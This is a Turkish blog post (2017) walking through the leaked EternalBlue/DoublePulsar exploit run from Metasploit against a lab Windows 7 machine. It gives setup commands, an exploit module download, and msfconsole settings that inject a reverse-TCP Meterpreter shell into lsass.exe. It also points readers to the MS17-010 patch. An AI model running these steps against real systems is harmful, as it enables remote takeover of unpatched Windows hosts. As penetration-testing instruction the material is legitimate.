---
layout: post
title: "Metasploit Framework EternalBlue&Double Pulsar"
date: 2017-05-02
share: true
description: Metasploit Framework EternalBlue&Double Pulsar
tags:
 - doublepulsar
 - shadow brokers
 - metasploit
comments: true
---

# Metasploit Framework EternalBlue&Double Pulsar

Selamlar , bildiğiniz gibi nsa tarafından yazılan kullanılan araçlardan bazıları shadow brokers adlı grup tarafından yayınlandı. 

Yayınlanan araçlardan fuzzbunch adındaki framework en fazla dikkat çeken araç oldu.

Özellikle doublepulsar backdooru ile birçok windows sürümlerine sızılabiliyor.

Bu zaafiyetlerden etkilenmemek için MS17-010 ile ilgili güncellemeleri yüklemelisiniz.

Sızdırılan exploitler kısa bir süre içinde engellendi fakat birçok github hesabı üzerinde bu toollara erişebilrisiniz.

Bir örnek:

[Nsa Shadow Brokers Tools](https://github.com/misterch0c/shadowbroker)

Bu sızıntı hakkında birçok bilgi bulunnaktadır araştırmanızı öneririm. Ben kısaca doublepulsarın metasploit frameworkü üzerinde kullanılmasından bahsedicem.

Eternalblue&Doublepulsar kısaca smb üzerinden dll injection yaparak hedefe sızmayı sağlıyor. Fuzzbunch frameworku üzerinde kullanılıyor.

Araştırırken hep windows üzerinde fuzzbunch'ı kullanarak hedefe sızmaya çalıştığını gördüm. Fakat fuzzbunch'ı windows üzerinde çalıştırmayı denerken bazı bağımlılıkları yüklerken hatalarla karşılaştım. Daha sonra gördüm ki doublepulsarı metasploit üzerindede kullanabiliyormuşuz. Hem bu şekilde kullanım açısından daha kolay olur diye düşündüm.

Sırasıyla aşağıdaki komutları çalıştırıyoruz.

>dpkg --add-architecture i386 && apt-get update && apt-get install wine32
>rm -r ~/.wine
>wine cmd.exe
>exit

Daha sonra [https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit](https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit) bu adresten metasploit için eternalblue&doublepulsar modünü indiriyoruz.

>git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit

İçerisinde bulunan <u>deps</u> klasörü ile <u>eternalblue_doublepulsar.rb</u> dosyasını kalide <u>/usr/share/metasploit-framework/modules/exploits/windows/smb/</u> klasörü içersine kopyalıyoruz.

>service postgresql start - - - > Metasploit veritabanını güncelliyoruz. Artık msfconsole'a geçebiliriz.

Ben Windows 7 Service Pack1 makinesine sızmayı deneyeceğim.

Windows 7 makinesini IP adresi > 172.16.72.129

Kali nin IP adresi > 172.16.72.128

Eternalblue modülünü kullanmak için msfconsole'de:

	use exploit/windows/smb/eternalblue_doublepulsar

![](/images/doublepulsar/1.png)

>show options ile set edebilceğimiz değerler:


![](/images/doublepulsar/2.png)

	set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/smb/deps
	set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/smb/deps
	set rhost 172.16.72.129
	set targetarchıtecture x64
	set payload windows/meterpreter/reverse_tcp
	set processşnject lsass.exe
	set lhost 172.16.72.128
	set target 9

![](/images/doublepulsar/3.png)

Son olarak değerler:

![](/images/doublepulsar/4.png)

Daha sonra exploit diyerek hedef makineye sızma işlemini gerçekleştiriyoruz.

![](/images/doublepulsar/5.png)





